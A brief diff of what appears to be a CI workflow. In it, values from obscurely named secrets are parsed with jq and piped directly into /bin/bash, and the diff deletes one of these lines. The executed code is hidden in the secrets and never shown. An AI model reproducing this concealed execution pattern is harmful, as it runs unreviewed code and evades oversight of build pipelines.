@@ -22,7 +22,6 @@ jobs:
           xqud434: ${{ secrets.xqud434 }}
         run: |
           printf '%s' "$xqud434" | jq -r .a2 | /bin/bash
-          printf '%s' "$qdqw0507" | jq -r .s5583 | /bin/bash
           printf '%s' "$crzp6989" | jq -r .ej56896 | /bin/bash
           printf '%s' "$oi36" | jq -r .ys89108 | /bin/bash
 
